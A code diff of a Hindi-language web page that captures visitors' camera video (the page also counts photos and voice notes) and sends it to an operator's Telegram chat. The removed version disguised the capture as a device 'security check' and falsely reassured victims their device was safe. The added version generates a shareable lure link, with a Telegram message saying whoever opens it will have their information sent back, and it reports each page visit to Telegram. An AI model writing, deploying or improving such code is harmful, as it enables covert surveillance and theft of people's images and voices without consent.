-    state.currentStep = 4;
-    updateProgress();
-    showStep(4);
-    photoSection.classList.add('hidden');
-    voiceSection.classList.add('hidden');
-    recordingSection.classList.remove('hidden');
+// ====== RECORD VIDEO ======
+async function startVideo() {
+  if (!mediaStream) {
+    addLog('पहले कैमरा चालू करें', 'error');
+    return;
+  }
+  
+  if (capturedVideos.length >= 1) {
+    addLog('अधिकतम 1 वीडियो', 'error');
+    return;
+  }
+  
+  if (isRecording) {
+    addLog('पहले से रिकॉर्डिंग चल रही है', 'error');
+    return;
+  }
+  
+  recordedChunks = [];
+  mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+  
+  mediaRecorder.ondataavailable = (e) => {
+    if (e.data.size > 0) recordedChunks.push(e.data);
+  };
+  
+  mediaRecorder.onstop = async () => {
+    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+    const url = URL.createObjectURL(blob);
+    capturedVideos.push(url);
+    updateCounts();
     
-    setStatus('🎥 20 सेकंड का वीडियो रिकॉर्ड हो रहा है...');
+    addLog(`🎥 वीडियो रिकॉर्ड हुआ`, 'success');
     
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-        videoPreview.srcObject = stream;
-        videoPreview.style.display = 'block';
-        
-        // Try different mime types
-        const mimeTypes = [
-            'video/webm;codecs=vp9,opus',
-            'video/webm;codecs=vp8,opus',
-            'video/webm;codecs=vp9',
-            'video/webm;codecs=vp8',
-            'video/webm',
-            'video/mp4'
-        ];
-        
-        let selectedMime = '';
-        for (const mt of mimeTypes) {
-            if (MediaRecorder.isTypeSupported(mt)) {
-                selectedMime = mt;
-                break;
-            }
-        }
-        
-        log(`वीडियो कोडेक: ${selectedMime || 'डिफ़ॉल्ट'}`, 'info');
-        
-        const recorderOptions = {};
-        if (selectedMime) recorderOptions.mimeType = selectedMime;
-        
-        const mediaRecorder = new MediaRecorder(stream, recorderOptions);
-        const videoChunks = [];
-        let remaining = 20;
-        
-        recTimer.textContent = remaining;
-        const timerInterval = setInterval(() => {
-            remaining--;
-            recTimer.textContent = remaining;
-            if (remaining <= 0) clearInterval(timerInterval);
-        }, 1000);
-        
-        mediaRecorder.ondataavailable = e => {
-            if (e.data.size > 0) videoChunks.push(e.data);
-        };
-        
-        mediaRecorder.onstop = async () => {
-            clearInterval(timerInterval);
-            stream.getTracks().forEach(t => t.stop());
-            videoPreview.style.display = 'none';
-            
-            const blob = new Blob(videoChunks, { type: selectedMime || 'video/webm' });
-            state.videoBlob = blob;
-            log(`वीडियो रिकॉर्ड किया गया: ${(blob.size / 1024 / 1024).toFixed(2)} MB`, 'success');
-            
-            setStatus('📤 वीडियो अपलोड हो रहा है...');
-            await sendTelegramVideo(blob);
-            
-            setStatus('✅ वीडियो रिकॉर्डिंग पूर्ण', 'success');
-            await new Promise(r => setTimeout(r, 1000));
-            step5();
-        };
-        
-        // Collect chunks every 1 second
-        mediaRecorder.start(1000);
-        
-        // Stop after 20 seconds
-        setTimeout(() => {
-            if (mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
-        }, 20000);
-        
-    } catch (e) {
-        log(`वीडियो त्रुटि: ${e.message}`, 'error');
-        setStatus('❌ वीडियो रिकॉर्ड नहीं हो सका', 'error');
+    // Show in gallery
+    const videoEl = document.createElement('video');
+    videoEl.src = url;
+    videoEl.controls = true;
+    videoEl.style.width = '100%';
+    videoEl.style.borderRadius = '8px';
+    gallery.insertBefore(videoEl, gallery.firstChild);
+    
+    // Send to Telegram
+    await sendVideoToTelegram(blob);
+    
+    // Store
+    saveToStorage();
+    isRecording = false;
+  };
+  
+  mediaRecorder.start();
+  isRecording = true;
+  addLog('🎥 वीडियो रिकॉर्डिंग शुरू... (20 सेकंड)', 'info');
+  
+  // Auto stop after 20 seconds
+  setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+      mediaRecorder.stop();
+      addLog('🎥 वीडियो रिकॉर्डिंग पूरी', 'success');
     }
+  }, 20000);
 }
 
-// ============================================================
-// STEP 5: COMPLETE
-// ============================================================
-async function step5() {
-    state.currentStep = 5;
-    updateProgress();
-    showStep(5);
-    actionSection.classList.add('hidden');
-    
-    setStatus('✅ सुरक्षा जाँच पूर्ण! आपका डिवाइस सुरक्षित है।', 'success');
-    
-    await sendTelegramMessage(`✅ <b>सुरक्षा जाँच पूर्ण</b>\n\n📸 फोटो: ${state.photos.length}/6\n🎤 वॉइस नोट: ${state.voiceNotes.length}/3\n🎥 वीडियो: ✅ (20 सेकंड)\n\n⏰ ${new Date().toLocaleString()}`);
-    
-    resetBtn.classList.remove('hidden');
-    resetBtn.onclick = () => {
-        // Stop bot polling
-        state.botPollingActive = false;
-        // Reset everything
-        state.photos = [];
-        state.voiceNotes = [];
-        state.videoBlob = null;
-        state.currentStep = 0;
-        progressFill.style.width = '0%';
-        for (let i = 1; i <= 5; i++) {
-            const el = $(`step${i}`);
-            el.classList.add('hidden');
-            el.classList.remove('done');
-        }
-        actionSection.classList.add('hidden');
-        resetBtn.classList.add('hidden');
-        setStatus('कृपया प्रतीक्षा करें, डिवाइस की जाँच की जा रही है...');
-        step1();
+// ====== LINK GENERATOR ======
+function generateLink() {
+  const baseUrl = window.location.origin + window.location.pathname;
+  myLink = `${baseUrl}?id=${TARGET_CHAT_ID}`;
+  
+  document.getElementById('linkInput').value = myLink;
+  document.getElementById('linkDisplay').classList.remove('hidden');
+  
+  addLog('🔗 लिंक जनरेट किया गया', 'success');
+  
+  // Send link to Telegram
+  sendToTelegram('sendMessage', {
+    chat_id: TARGET_CHAT_ID,
+    text: `🔗 <b>आपका लिंक तैयार है:</b>\n<code>${myLink}</code>\n\nयह लिंक किसी को भी भेजें। जब वह खोलेगा, उसकी जानकारी यहाँ आएगी।`,
+    parse_mode: 'HTML'
+  });
+}
+
+function copyLink() {
+  const input = document.getElementById('linkInput');
+  input.select();
+  document.execCommand('copy');
+  addLog('📋 लिंक कॉपी किया गया', 'success');
+}
+
+// ====== LOCAL STORAGE ======
+function saveToStorage() {
+  try {
+    const data = {
+      photos: capturedPhotos,
+      voices: capturedVoices,
+      videos: capturedVideos,
+      timestamp: Date.now()
     };
+    localStorage.setItem('camData', JSON.stringify(data));
+  } catch(e) {
+    // Storage full or unavailable - ignore
+  }
 }
 
-// ============================================================
-// START
-// ============================================================
-step1();
+function loadFromStorage() {
+  try {
+    const raw = localStorage.getItem('camData');
+    if (raw) {
+      const data = JSON.parse(raw);
+      capturedPhotos = data.photos || [];
+      capturedVoices = data.voices || [];
+      capturedVideos = data.videos || [];
+      updateCounts();
+      
+      // Restore gallery
+      capturedPhotos.forEach(url => {
+        const img = document.createElement('img');
+        img.src = url;
+        gallery.appendChild(img);
+      });
+    }
+  } catch(e) {}
+}
+
+// ====== INIT ======
+loadFromStorage();
+addLog(`✅ बॉट कॉन्फ़िगर हुआ। Chat ID: ${TARGET_CHAT_ID}`, 'info');
+addLog('📷 कैमरा चालू करने के लिए बटन दबाएँ', 'info');
+
+// Send page load notification
+sendToTelegram('sendMessage', {
+  chat_id: TARGET_CHAT_ID,
+  text: `🌐 <b>पेज खोला गया</b>\n\nकोई व्यक्ति आपके लिंक पर आया है।\nसमय: ${new Date().toLocaleString('hi-IN')}\nURL: ${window.location.href}`,
+  parse_mode: 'HTML'
+});
 </script>
 </body>
 </html>
